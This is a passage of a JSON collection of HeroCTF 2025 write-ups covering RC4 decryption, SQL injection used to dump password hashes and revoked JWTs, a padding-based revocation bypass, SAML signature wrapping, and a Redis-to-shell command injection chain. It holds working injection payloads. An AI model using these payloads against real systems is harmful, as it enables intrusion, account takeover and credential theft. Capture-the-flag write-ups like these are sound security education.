extracted!</p>\n<p><strong>The Flag: <code>Hero{e9e2b63a0daa9ee41d2133b450425b2cd7c7510e5a28b655748456bd3f6e5c2a}</code></strong></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "perilous",
                "title": "Perilous",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor",
                    "rop"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>The challenge involved a Python script (<code>chall.py</code>) that implemented a custom encryption service using the <code>cryptography</code> library's <code>hazmat.decrepit.ciphers.algorithms.ARC4</code> algorithm.</p>\n<p>Key features of the script:</p>\n<ul>\n<li>Reads a <code>FLAG</code> from <code>flag.txt</code>.</li>\n<li>Generates a random <code>MASK</code> of the same length as the <code>FLAG</code>.</li>\n<li>An <code>xor</code> function that handles repeating the shorter byte string.</li>\n<li>An <code>encrypt</code> function that takes a hexadecimal key (<code>k</code>) and a hexadecimal message (<code>m</code>).</li>\n<li><strong>Crucially, the <code>encrypt</code> function prevents key reuse:</strong> it maintains a list <code>KEYS</code> of all previously used keys and raises an exception if an attempt is made to encrypt with an already used key (<code>if k in KEYS: raise Exception(\"Duplicate key used, aborting\")</code>).</li>\n<li>The encryption process within <code>encrypt</code> was:</li>\n</ul>\n<ol>\n<li><code>m = xor(m, MASK)</code></li>\n<li><code>m = encryptor.update(m)</code> (RC4 encryption)</li>\n<li><code>m = xor(m, MASK)</code></li>\n</ol>\n<ul>\n<li>The script first encrypts the <code>FLAG</code> using a user-provided key, then enters a loop allowing arbitrary key/message encryptions.</li>\n</ul>\n<h3>2. Vulnerability Identification</h3>\n<p>Upon analyzing the <code>encrypt</code> function, the double XOR with <code>MASK</code> was a point of interest. Let <code>KS</code> be the RC4 keystream generated by the key <code>k</code>. The encryption effectively became: <code>final_encrypted = ((plaintext_message ^ MASK) ^ KS) ^ MASK</code> Due to the properties of XOR (<code>A ^ B ^ B = A</code>), this simplifies to: <code>final_encrypted = plaintext_message ^ KS</code> This means the <code>MASK</code> operations effectively cancel each other out, and the encryption is simply a standard RC4 stream cipher encryption (or decryption, as RC4 is symmetric).</p>\n<p>The primary constraint was the prevention of key reuse. A typical known-plaintext attack on RC4 involves encrypting a known plaintext with the same key used for the target ciphertext to recover the keystream. Since key reuse was blocked, a direct application of this was not possible through the service's interface.</p>\n<p>However, the import path <code>cryptography.hazmat.decrepit.ciphers.algorithms.ARC4</code> and the welcome message \"Some may call it deprecated, I call it vintage\" strongly hinted at inherent weaknesses in the ARC4 algorithm itself, especially with \"weak keys\" or short keys. RC4 is known for producing biased keystreams or being susceptible to state recovery for certain keys.</p>\n<p>The key insight for this CTF was that RC4 is a deterministic stream cipher. For a given key, it will *always* produce the same keystream. If we can choose a key for the <code>FLAG</code> encryption, and we know that key, we can *locally* generate the corresponding keystream without needing to reuse the key on the server.</p>\n<h3>3. Attack Strategy (Local Challenge)</h3>\n<ol>\n<li><strong>Choose a \"Weak\" but Valid Key:</strong> Based on <code>cryptography</code> library documentation and common RC4 weaknesses, keys between 5 and 256 bytes are generally valid. We chose the simplest valid key: 5 null bytes, represented in hex as <code>\"0000000000\"</code>.</li>\n</ol>\n<ol>\n<li><strong>Extract Encrypted Flag (<code>C_flag_hex</code>):</strong></li>\n</ol>\n<ul>\n<li>Interacting directly with <code>input()</code> via <code>run_shell_command</code> proved difficult.</li>\n<li>To ensure correct input, <code>chall.py</code> was temporarily modified:</li>\n<li><code>k = input(\"flag k: \")</code> was changed to <code>k = \"0000000000\"</code>.</li>\n<li>The <code>print(encrypt(k, FLAG.hex()))</code> line was changed to capture and print *only* the hex string for easier parsing.</li>\n<li>The <code>while True</code> loop was commented out.</li>\n<li>The modified script was executed, and the output <code>C_flag_hex = \"967dfb2ed8711c71cf59582b1629ef67\"</code> was captured.</li>\n<li>The original <code>chall.py</code> was then restored.</li>\n</ul>\n<ol>\n<li><strong>Local Keystream Generation:</strong></li>\n</ol>\n<ul>\n<li>The length of the <code>FLAG</code> in bytes was determined from the length of <code>C_flag_hex</code> (<code>FLAG_len_bytes = len(C_flag_hex) // 2</code>).</li>\n<li>A local Python script was used to instantiate <code>algorithms.ARC4(bytes.fromhex(\"0000000000\"))</code> and generate a keystream of <code>FLAG_len_bytes</code> length by encrypting a block of null bytes (<code>b'\\x00' * FLAG_len_bytes</code>).</li>\n</ul>\n<ol>\n<li><strong>Decryption:</strong> The captured <code>C_flag_bytes</code> was XORed with the locally generated <code>KS_flag_bytes</code> to recover the <code>FLAG_bytes</code>.</li>\n</ol>\n<p><strong>Local Flag:</strong> <code>Hero{FAKE_FLAG}</code></p>\n<h3>4. Attack Strategy (Remote Challenge)</h3>\n<p>The same attack strategy was applied to the remote server (<code>nc crypto.heroctf.fr 9001</code>).</p>\n<ol>\n<li><strong>Connect and Provide Key:</strong> Used <code>nc crypto.heroctf.fr 9001</code> and provided <code>\"0000000000\"</code> when prompted for <code>flag k:</code>.</li>\n<li><strong>Capture Remote <code>C_flag_hex</code>:</strong> The server responded with the encrypted flag <code>C_flag_hex = \"967dfb2ed8003509d5762d156602a732f77c20d1c3bcd8a3721a230478e66ba99fff076958e2\"</code>.</li>\n<li><strong>Local Decryption:</strong> The captured <code>C_flag_hex</code> from the remote server was then decrypted using the same local keystream generation and XOR method as for the local challenge.</li>\n</ol>\n<h3>5. Tools Used</h3>\n<ul>\n<li><code>python3</code></li>\n<li><code>cryptography</code> library (for local keystream generation)</li>\n<li><code>netcat</code> (<code>nc</code>) (for interacting with the remote server)</li>\n</ul>\n<h3>6. Final Flag</h3>\n<p><strong>Remote Flag:</strong> <code>Hero{7h3_p3r1l5_0f_r3p3471n6_p4773rn5}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "revoked-revenge",
                "title": "Revoked Revenge",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "flask",
                    "cookie",
                    "sql",
                    "injection",
                    "jwt",
                    "rop"
                ],
                "writeup": "<p><strong>1. Initial Analysis</strong></p>\n<p>The challenge provided a URL to a web application and the <code>main.py</code> source code. Initial review of <code>main.py</code> revealed:</p>\n<ul>\n<li>The application is built with Flask.</li>\n<li>It uses SQLite for its database, with tables <code>users</code>, <code>revoked_tokens</code>, and <code>employees</code>.</li>\n<li>Authentication is handled via JWTs, stored in cookies.</li>\n<li>A <code>token_required</code> decorator checks for valid and non-revoked JWTs.</li>\n<li>The <code>/admin</code> endpoint is protected and serves the flag if the user has <code>is_admin: 1</code> in their JWT.</li>\n<li>The <code>SECRET_KEY</code> for JWT signing is randomly generated at each startup, preventing direct JWT forging.</li>\n</ul>\n<p><strong>2. Vulnerability Discovery: SQL Injection in /employees</strong></p>\n<p>The <code>/employees</code> endpoint was identified as vulnerable to SQL Injection:</p>\n<pre><code class=\"python\">\n@app.route(\"/employees\", methods=[\"GET\"])\n\n@token_required\n\ndef employees():\n\n    query = request.args.get(\"query\", \"\")\n\n    conn = get_db_connection()\n\n    cursor = conn.cursor()\n\n    cursor.execute(\n\n        f\"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'\"\n\n    )\n\n    # ... rest of the code\n\n</code></pre>\n<p>The <code>query</code> parameter is directly interpolated into the SQL query without proper sanitization, allowing for arbitrary SQL to be executed.</p>\n<p><strong>3. Exploiting SQL Injection - Dumping Admin Credentials</strong></p>\n<p>To proceed, a regular user was registered and logged in to obtain a valid JWT to access the <code>/employees</code> endpoint.</p>\n<ul>\n<li>Registered user: <code>testuser:testpassword</code></li>\n<li>Logged in to obtain JWT.</li>\n</ul>\n<p>An <code>UNION SELECT</code> attack was crafted to extract information from the <code>users</code> table. The <code>employees</code> query selects 4 columns (<code>id, name, email, position</code>). The <code>users</code> table contains <code>id, username, is_admin, password_hash</code>.</p>\n<p>Initial payload attempt: <code>a'+AND+1=0+UNION+SELECT+id,username,password_hash,is_admin+FROM+users+WHERE+is_admin=1--</code> This payload aimed to make the original <code>employees</code> query return no results (<code>AND 1=0</code>) and then union it with a select statement from the <code>users</code> table, specifically looking for users where <code>is_admin</code> is <code>1</code>.</p>\n<p>The output from the server showed:</p>\n<ul>\n<li><code>&lt;h5 class=\"card-title fw-bold text-dark mb-2\"&gt;admin&lt;/h5&gt;</code></li>\n<li><code>&lt;p class=\"card-text text-muted mb-3\"&gt;1&lt;/p&gt;</code></li>\n</ul>\n<p>This indicated that <code>username</code> (\"admin\") was mapped to the <code>name</code> field, and <code>is_admin</code> (\"1\") was mapped to the <code>position</code> field. However, the <code>password_hash</code> (which was mapped to the <code>email</code> field) was not displayed in the HTML output.</p>\n<p>To retrieve the password hash, the <code>UNION SELECT</code> was modified to display the <code>password_hash</code> in the <code>name</code> field and the <code>username</code> in the <code>position</code> field:</p>\n<p>Payload: <code>a'+AND+1=0+UNION+SELECT+id,password_hash,NULL,username+FROM+users+WHERE+is_admin=1--</code></p>\n<p>This returned:</p>\n<ul>\n<li><code>&lt;h5 class=\"card-title fw-bold text-dark mb-2\"&gt;$2b$12$bxz42WrC.uUZVc38WiLSYeIlVB84xd5Ta2uBZW8S8wSwW1iGlAuhG&lt;/h5&gt;</code></li>\n<li><code>&lt;p class=\"card-text text-muted mb-3\"&gt;admin&lt;/p&gt;</code></li>\n</ul>\n<p>Extracted admin credentials:</p>\n<ul>\n<li><strong>Username:</strong> <code>admin</code></li>\n<li><strong>Password Hash:</strong> <code>$2b$12$bxz42WrC.uUZVc38WiLSYeIlVB84xd5Ta2uBZW8S8wSwW1iGlAuhG</code></li>\n</ul>\n<p><strong>4. Vulnerability Discovery: JWT Revocation Bypass</strong></p>\n<p>Since the JWT <code>SECRET_KEY</code> is dynamic, direct forging of an admin token was not feasible. However, the <code>token_required</code> function's revocation check was identified as a potential bypass vector, similar to a previous challenge:</p>\n<pre><code class=\"python\">\n            revoked = conn.execute(\n\n                \"SELECT id FROM revoked_tokens WHERE token = ?\", (token,)\n\n            ).fetchone()\n\n            # ...\n\n            if not user or revoked:\n\n                flash(\"Invalid or revoked token!\", \"error\")\n\n                return redirect(\"/login\")\n\n</code></pre>\n<p>This code performs a strict string equality check when looking up a token in the <code>revoked_tokens</code> table. If a token that is syntactically valid but has extra padding (e.g., <code>=</code> characters) is passed, the <code>PyJWT</code> library might still decode it, but the SQLite <code>WHERE token = ?</code> clause with strict equality would fail to match it against a stored, unpadded token.</p>\n<p><strong>5. Exploiting JWT Revocation Bypass - Obtaining Admin Access</strong></p>\n<p>The next step was to dump existing revoked tokens to find an admin token.</p>\n<p>Payload: <code>a'+AND+1=0+UNION+SELECT+id,token,NULL,NULL+FROM+revoked_tokens--</code></p>\n<p>This successfully returned several revoked tokens, including one for the <code>admin</code> user: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyODU3OS4zMTE2OTl9.QY6letwO9U3kUpDaM4sGBa3NpJrBwbBMYcnnFoSJ91E</code></p>\n<p>This revoked admin token was then used to access the <code>/admin</code> endpoint after appending a padding character (<code>=</code>).</p>\n<p>Padded Token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyODU3OS4zMTE2OTl9.QY6letwO9U3kUpDaM4sGB3NpJrBwbBMYcnnFoSJ91E=</code></p>\n<p>By making a request to <code>/admin</code> with this padded token as the <code>JWT</code> cookie, the application granted access to the admin panel.</p>\n<p><strong>6. Flag</strong></p>\n<p>The <code>/admin</code> panel displayed the flag: <code>Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "revoked",
                "title": "Revoked",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "flask",
                    "cookie",
                    "sql",
                    "injection",
                    "jwt",
                    "stack",
                    "crack"
                ],
                "writeup": "<h3>Initial Analysis (from main.py)</h3>\n<ol>\n<li><strong>Tech Stack</strong>: Flask, SQLite, bcrypt, PyJWT.</li>\n<li><strong>Authentication</strong>: Uses JWTs stored in cookies. Tokens are signed with a randomly generated <code>SECRET_KEY</code> on server startup.</li>\n<li><strong>Authorization</strong>: The <code>@token_required</code> decorator checks the JWT. It decodes the token, extracts the <code>username</code>, and then queries the database (<code>SELECT id,is_admin FROM users WHERE username = ?</code>) to re-validate the user's existence and <code>is_admin</code> status. If <code>is_admin</code> is True, access is granted.</li>\n<li><strong>Revocation</strong>: Tokens can be revoked by logging out. Revoked tokens are stored in the <code>revoked_tokens</code> SQLite table. The <code>@token_required</code> decorator checks this table to invalidate revoked tokens.</li>\n<li><strong>User Creation</strong>: The <code>/register</code> route hardcodes <code>is_admin=False</code> for all new users.</li>\n<li><strong>SQL Injection</strong>: A clear SQL Injection vulnerability was identified in the <code>/employees</code> route:</li>\n</ol>\n<p>``<code>python     cursor.execute(f\"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'\")     </code>`<code>     This allowed arbitrary </code>UNION SELECT` statements.</p>\n<h3>Exploitation Steps</h3>\n<h4>1. Identify Target and Data Exfiltration</h4>\n<ul>\n<li>The goal was to access the <code>/admin</code> route, which required <code>is_admin=True</code>.</li>\n<li>Initial analysis showed no way to register an admin user or forge a JWT (due to random <code>SECRET_KEY</code>).</li>\n<li>The SQL Injection in <code>/employees</code> was leveraged to dump database contents.</li>\n</ul>\n<h4>2. Dump <code>users</code> Table and Schema</h4>\n<ul>\n<li>A custom <code>exploit.py</code> script was created to automate interaction with the web application.</li>\n<li>The script registered a new user, logged in to obtain a valid (non-admin) JWT.</li>\n<li>Using the SQL Injection, the <code>users</code> table was dumped:</li>\n</ul>\n<p>``<code>sql     ' UNION SELECT id, username, password_hash, is_admin FROM users --     </code>``</p>\n<ul>\n<li>This revealed two administrative users: <code>admin</code> and <code>admin1</code>, both with <code>is_admin=1</code> and bcrypt password hashes.</li>\n<li><code>admin</code>: <code>$2b$12$paAeWwE7G3kMbKd9V2344.VheW.CY4CEvw6MpB18ce9ACKYvwo5We</code></li>\n<li><code>admin1</code>: <code>$2b$12$2Gongni0OWKE.kgVxUcSPuKv6m05tY1WvHGMIVCenUymB2k/cTXpS</code></li>\n<li>Attempted cracking of these bcrypt hashes with common password lists failed, indicating strong passwords or non-standard choices.</li>\n</ul>\n<h4>3. Focus on \"Revoked\" - Dump <code>revoked_tokens</code> Table</h4>\n<ul>\n<li>Given the challenge name \"Revoked\", attention shifted to the <code>revoked_tokens</code> table.</li>\n<li>The <code>revoked_tokens</code> table was dumped using SQL Injection:</li>\n</ul>\n<p>``<code>sql     ' UNION SELECT id, id, 'dummy', token FROM revoked_tokens --     </code>``</p>\n<ul>\n<li>This revealed several revoked tokens, including one for the <code>admin</code> user:</li>\n</ul>\n<p>``<code>     Revoked Token ID: 2 | Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyMjkwOC45NjM4MDY0fQ.4CGjZX4VVJR8clWviAdL8SYL3yP29wI30D2kcTCmPCs     </code>``</p>\n<ul>\n<li>Decoding this JWT confirmed its payload: <code>{\"username\":\"admin\",\"is_admin\":1,\"issued\":1764422908.9638064}</code>. This was a valid token for an admin user, but it was marked as revoked in the database.</li>\n</ul>\n<h4>4. JWT Revocation Bypass (Padding Mismatch)</h4>\n<ul>\n<li>The key to bypassing the revocation check lay in a subtle difference in how <code>PyJWT</code> (the Python JWT library) and SQLite handle Base64URL string comparison.</li>\n<li><code>PyJWT</code> is flexible with Base64 padding. It will often accept a Base64URL string even if it has incorrect or absent padding characters (<code>=</code>).</li>\n<li>SQLite's string comparison (used in <code>SELECT ... WHERE token = ?</code>) is typically strict and requires an exact match.</li>\n<li><strong>Hypothesis</strong>: If the revoked token was stored in <code>revoked_tokens</code> without padding, providing the *same* token with padding (<code>=</code>) might allow it to be decoded by <code>PyJWT</code> (thus passing signature verification) but *not* matched by SQLite's strict equality check against the stored (unpadded) revoked token. This would cause the <code>revoked</code> flag in the <code>token_required</code> decorator to be <code>None</code>, effectively bypassing the revocation check.</li>\n<li>The raw revoked token did not have padding. Appending a single <code>=</code> to the base64-encoded signature part of the token was attempted.</li>\n</ul>\n<h4>5. Final Exploit</h4>\n<ul>\n<li>The revoked <code>admin</code> JWT was taken: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyMjkwOC45NjM4MDY0fQ.4CGjZX4VVJR8clWviAdL8SYL3yP29wI30D2kcTCmPCs</code></li>\n<li>A padding character (<code>=</code>) was appended to it: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyMjkwOC45NjM4MDY0fQ.4CGjZX4VVJR8clWviAdL8SYL3yP29wI30D2kcTCmPCs=</code></li>\n<li>This modified token was then used as the <code>JWT</code> cookie to request the <code>/admin</code> route.</li>\n<li>The request returned a <code>200 OK</code> status, and the HTML content included the flag.</li>\n</ul>\n<h3>Flag</h3>\n<p><code>Hero{N0t_th4t_r3v0k3d_ec6dcf0ae6ae239c4d630b2f5ccb51bb}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "samlevinson",
                "title": "SAMLevinson",
                "category": "Web Exploitation",
                "tags": [
                    "encoding",
                    "web",
                    "http",
                    "cookie"
                ],
                "writeup": "<p><strong>Challenge:</strong> Obtain the flag from a Sam Levinson fan club website where the login page is reportedly not working. A functional account on the IDP is provided: <code>user:oyJPNYd3HgeBkaE%!rP#dZvqf2z*4$^qcCW4V6WM</code>.</p>\n<p><strong>Challenge URLs:</strong></p>\n<ul>\n<li>APP (Service Provider - SP): <code>http://web.heroctf.fr:8080</code></li>\n<li>IDP (Identity Provider): <code>http://web.heroctf.fr:8081</code></li>\n</ul>\n<p><strong>Initial Analysis:</strong></p>\n<ol>\n<li>The challenge explicitly mentions \"SAML\", suggesting a vulnerability related to Security Assertion Markup Language.</li>\n<li>A Python script <code>decode.py</code> was present in the directory, hinting at SAML response manipulation (specifically, changing roles and stripping signatures).</li>\n<li>The provided credentials are for the IDP.</li>\n<li>The APP has a \"SSO Login\" link, which initiates the SAML flow.</li>\n</ol>\n<p><strong>Reconnaissance (using <code>curl</code>):</strong></p>\n<ol>\n<li><strong>Visiting the APP:</strong></li>\n</ol>\n<p><code>curl -v http://web.heroctf.fr:8080</code>     This revealed a login page with a local login form and an \"SSO Login\" link to <code>/flag</code>.</p>\n<ol>\n<li><strong>Initiating SSO Login:</strong></li>\n</ol>\n<p><code>curl -v -L http://web.heroctf.fr:8080/flag</code>     This showed a <code>302 Found</code> redirect to <code>http://web.heroctf.fr:8081/sso</code> with a <code>SAMLRequest</code> parameter. The response also contained an HTML form to the IDP's <code>/sso</code> endpoint, including <code>user</code>, <code>password</code>, <code>SAMLRequest</code> (as a hidden field), and <code>RelayState</code> (as a hidden field). A <code>Set-Cookie</code> header for <code>saml_...</code> was also     observed for <code>/saml/acs</code> on the SP, which had a <code>Max-Age</code> of 90 seconds.</p>\n<p><strong>Initial Exploitation Attempts & Debugging:</strong></p>\n<p>The initial idea was to use the provided <code>decode.py</code> script, which involved:</p>\n<ol>\n<li>Capturing the SAMLResponse from the IDP after successful authentication.</li>\n<li>Modifying the <code>eduPersonAffiliation</code> attribute from \"Users\" to \"Administrators\".</li>\n<li>Removing the XML Digital Signature (<code>&lt;ds:Signature&gt;...&lt;/ds:Signature&gt;</code>).</li>\n<li>Re-encoding and submitting the modified SAMLResponse to the SP's Assertion Consumer Service (ACS) endpoint (<code>http://web.heroctf.fr:8080/saml/acs</code>).</li>\n</ol>\n<p>However, direct implementation of this \"Signature Stripping\" attack led to a <code>403 Forbidden</code> error from the SP. Debugging revealed:</p>\n<ol>\n<li><strong>Signature Stripping Failure:</strong> Even with the <code>decode.py</code> script's signature removal (which was initially buggy due to a regex issue, later fixed), the SP returned <code>403 Forbidden</code>. This indicated that the SP likely enforced signature validation and would not accept an unsigned assertion.</li>\n<li><strong>Expired Session/SAML Response:</strong> Initial manual <code>curl</code> attempts failed due to the <code>saml_...</code> cookie (for SP state tracking) expiring (90 seconds) or the SAML Assertion's <code>NotOnOrAfter</code> condition expiring due to delays between steps.</li>\n</ol>\n<p><strong>Refined Strategy: Automated XML Signature Wrapping (XSW) Attack</strong></p>\n<p>To overcome the signature enforcement and time sensitivity, an automated Python script (<code>solve.py</code>) was developed using <code>urllib</code> to quickly perform the steps. The core of the solution involved an <strong>XML Signature Wrapping (XSW)</strong> attack:</p>\n<ol>\n<li><strong>Confirming Valid Login:</strong> First, <code>solve.py</code> was configured to perform a normal login (no SAML modifications). This resulted in a successful <code>200 OK</code> from the SP, displaying a \"Hello, user\" page with the message: \"You are not part of the \"Administrators\" group. You do not have the necessary privileges to view the flag.\" This confirmed that the base login flow worked and that the goal was indeed privilege escalation.</li>\n</ol>\n<ol>\n<li><strong>Implementing XSW (Type #2):</strong></li>\n</ol>\n<p>The SP required a valid signature, but we also needed to inject an \"Administrators\" role. XSW allows keeping the valid signature while injecting malicious content. The strategy was:</p>\n<ul>\n<li><strong>Capture a fresh SAMLResponse:</strong> The <code>solve.py</code> script programmatically initiated the SAML flow to get a fresh, valid SAMLResponse from the IDP.</li>\n<li><strong>Extract the original Assertion:</strong> The <code>&lt;saml:Assertion&gt;...&lt;/saml:Assertion&gt;</code> block (which contains the valid signature and the \"Users\" role) was extracted from the fresh SAMLResponse.</li>\n<li><strong>Create a forged Assertion (Evil Assertion):</strong> A copy of the original Assertion was made. In this copy:</li>\n<li>Its <code>ID</code> attribute was changed to a new, unique value (e.g., <code>ID=\"evil-assertion\"</code>) to prevent collisions.</li>\n<li>The <code>eduPersonAffiliation</code> value was changed from \"Users\" to \"Administrators\".</li>\n<li>The <code>&lt;ds:Signature&gt;...&lt;/ds:Signature&gt;</code> block was removed from this *Evil Assertion* (as it would be invalid after modification).</li>\n<li><strong>Wrap the Response:</strong> The original <code>samlp:Response</code> XML was modified by inserting the *Evil Assertion* immediately *after* the original, valid Assertion. This creates a structure like:</li>\n</ul>\n<p>``<code>xml         &lt;samlp:Response ...&gt;           &lt;saml:Assertion ID=\"original-id\"&gt;...&lt;/saml:Assertion&gt;  &lt;!-- Original, signed, \"Users\" --&gt;           &lt;saml:Assertion ID=\"evil-assertion\"&gt;...&lt;/saml:Assertion&gt; &lt;!-- Forged, unsigned, \"Administrators\" --&gt;         &lt;/samlp:Response&gt;         </code>``</p>\n<ul>\n<li><strong>Re-encode and Submit:</strong> The entire modified <code>samlp:Response</code> (with both assertions) was Base64 encoded and URL-encoded, then submitted to the SP's ACS endpoint.</li>\n</ul>\n<p><strong>Result:</strong></p>\n<p>This XSW #2 approach (evil assertion appended after the valid one) resulted in a <code>200 OK</code> response from the SP. The returned HTML page displayed \"Hello, user\" but now showed a tag for \"Admin\" and contained the flag:</p>\n<pre><code class=\"\">\n&lt;div class=\"alert ok\"&gt;Access granted. Here is your flag:&lt;/div&gt;\n\n&lt;pre class=\"flag\" id=\"flagBox\"&gt;Hero{S4ML_3XPL01T_FR0M_CR3J4M}&lt;/pre&gt;\n\n</code></pre>\n<p>The SP's parsing logic likely performed signature validation on the first (valid) assertion, but then processed (or merged attributes from) subsequent assertions, including our forged one with the \"Administrators\" role. The technical details section showed: <code>eduPersonAffiliation</code> : <code>Users, Administrators</code> This confirms that the attributes from both assertions were considered, successfully elevating privileges.</p>\n<p><strong>Flag:</strong> <code>Hero{S4ML_3XPL01T_FR0M_CR3J4M}</code></p>"
            },
            {
                "id": "spring-drive",
                "title": "Spring Drive",
                "category": "Web Exploitation",
                "tags": [
                    "http",
                    "sql",
                    "injection",
                    "pwn",
                    "memory"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The \"Spring Drive\" challenge is a Java Spring application consisting of a backend API and a database (PostgreSQL), cached by Redis, and protected by a ClamAV file scanner. The goal is to retrieve a flag located in the <code>/app/</code> directory.</p>\n<h3>Vulnerabilities</h3>\n<p>The application suffers from two critical vulnerabilities that, when chained together, allow for Remote Code Execution (RCE).</p>\n<h4>1. Weak Password Reset Token (Admin Account Takeover)</h4>\n<p>The <code>ResetPasswordToken</code> class implements a weak hash function:</p>\n<pre><code class=\"java\">\n@Override\n\npublic int hashCode() {\n\n    return token.hashCode() + email.hashCode();\n\n}\n\n</code></pre>\n<p>The application stores tokens in memory and validates them using <code>contains()</code>, which relies on <code>equals()</code>. The <code>equals()</code> implementation checks if the token prefix (UUID) matches and if the hash codes are identical. This allows for a \"Meet-in-the-Middle\" attack:</p>\n<ol>\n<li>An attacker requests a reset token for their own account, obtaining a valid <code>UUID</code>.</li>\n<li>The attacker forges a token for the Admin (ID 1) using this <code>UUID</code>.</li>\n<li>The attacker finds a \"collision email\" string such that <code>Hash(ForgedToken) + Hash(CollisionEmail) == Hash(RealToken) + Hash(RealEmail)</code>.</li>\n<li>Using this collision email and forged token, the attacker can successfully reset the Admin's password.</li>\n</ol>\n<h4>2. Redis Command Injection via HTTP Method Smuggling (RCE)</h4>\n<p>The <code>FileController</code> exposes an endpoint <code>/file/remote-upload</code> accessible only to administrators. It takes a URL and an HTTP Method as input and uses <code>OkHttp</code> to fetch the resource. The <code>method</code> parameter is passed directly to the <code>OkHttp</code> request builder without sufficient validation:</p>\n<pre><code class=\"java\">\nRequest request = new Request.Builder()\n\n        .url(remoteUrl)\n\n        .method(method, null)\n\n        .build();\n\n</code></pre>\n<p>This allows injecting arbitrary data into the request line. By targeting the internal Redis service (<code>http://localhost:6379/</code>) and injecting the <code>RPUSH</code> command via the HTTP method, an attacker can add malicious entries to the <code>clamav_queue</code>.</p>\n<p>The <code>ClamAVService</code> consumes paths from this queue and executes them using <code>Runtime.exec</code> with insufficient sanitization:</p>\n<pre><code class=\"java\">\nString command = String.format(\"clamscan --quiet '%s'\", filePath);\n\nProcessBuilder processBuilder = new ProcessBuilder(\"/bin/sh\", \"-c\", command);\n\n</code></pre>\n<p>This leads to Command Injection.</p>\n<h3>Exploit Chain</h3>\n<ol>\n<li><strong>Registration:</strong> The attacker registers a user (<code>attacker1</code>) with a valid email (<code>attacker1@x.com</code>) and password (>=8 chars).</li>\n<li><strong>Token Retrieval:</strong> The attacker requests a password reset and retrieves the token (including UUID and ID) from the <code>/auth/email</code> debug endpoint.</li>\n<li><strong>Hash Collision:</strong> A script calculates a \"collision email\" (<code>alikg88e</code>) that generates the same hash sum as the legitimate token when combined with the forged Admin token structure (<code>UUID|1</code>).</li>\n<li><strong>Admin Takeover:</strong> The attacker sends a <code>reset-password</code> request using the collision email and forged token, setting the Admin password to <code>admin123</code>.</li>\n<li><strong>Persistence:</strong> The attacker logs in as Admin and uploads a placeholder file (<code>pwn.txt</code>) to generate a valid, writable file path (e.g., <code>/app/uploads/&lt;UUID&gt;</code>).</li>\n<li><strong>RCE Injection:</strong> The attacker uses the <code>remote-upload</code> endpoint to inject a Redis command:</li>\n</ol>\n<p>``<code>     RPUSH clamav_queue \"'; cp /app/flag*.txt /app/uploads/&lt;UUID&gt;; echo '\"     </code>``     This command is pushed to the Redis queue.</p>\n<ol>\n<li><strong>Execution:</strong> The <code>ClamAVService</code> (running on a cron every 60s) pops the payload from the queue. The injected command executes <code>cp</code>, overwriting the placeholder file with the contents of the flag file.</li>\n<li><strong>Retrieval:</strong> The attacker downloads the placeholder file, which now contains the flag.</li>\n</ol>\n<p><a href=\"/home/s31zur3/Downloads/heroctf/spring_drive/exploit_console.js\" target=\"_blank\">exploit_console.js</a></p>\n<h3>Flag</h3>\n<p><code>Hero{8be9845ab07c17c7f0c503feb0d91184}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "the-chef's-secret-recipe",
                "title": "The Chef's Secret Recipe",
                "category": "Reverse Engineering",
                "tags": [
                    "buffer",
                    "reverse",
                    "assembly",
                    "crack"
                ],
                "writeup": "<p>Analysis:</p>\n<ol>\n<li>The challenge involves reverse engineering the provided <code>my_secret_recipe</code> binary.</li>\n<li>Executing the binary without arguments reveals its usage: <code>./my_secret_recipe &lt;FLAG_STR&gt;</code>. This suggests it validates a flag string.</li>\n<li>Initial <code>strings</code> analysis reveals a long \"recipe\" text and success/failure messages, along with several words that appear to be ingredients or cooking actions. It also reveals function names like <code>parse_recipe</code> and <code>normalize_word</code>.</li>\n<li>Disassembly of the <code>main</code> function shows that it takes the user-provided <code>&lt;FLAG_STR&gt;</code>, calls <code>parse_recipe</code> with a hardcoded \"recipe\" string, and then compares the result of <code>parse_recipe</code> with the user's input using <code>strcmp</code>. If they match, it prints a success message and the flag.</li>\n<li>Disassembly of <code>parse_recipe</code> reveals the core logic:</li>\n</ol>\n<ul>\n<li>It tokenizes the hardcoded recipe string using space and newline characters as delimiters.</li>\n<li>For each token (word), it calls <code>normalize_word</code> (which was not explicitly analyzed, but likely handles case or punctuation).</li>\n<li>It then iterates through an array of ingredient structures. Each structure contains a pointer to an ingredient name (string) and a pointer to a small function.</li>\n<li>If a token from the recipe matches an ingredient name, the corresponding function pointer is called.</li>\n<li>These small functions (e.g., <code>bake</code>, <code>perfect</code>, <code>sift</code>) simply load a specific byte into the <code>eax</code> register and return.</li>\n<li>The returned byte (character) is then stored into a dynamically calculated offset in a buffer. The offset is determined by the index of the matched ingredient in the <code>ingredients</code> array.</li>\n</ul>\n<ol>\n<li>By inspecting the <code>.data</code> and <code>.rodata</code> sections of the binary, the 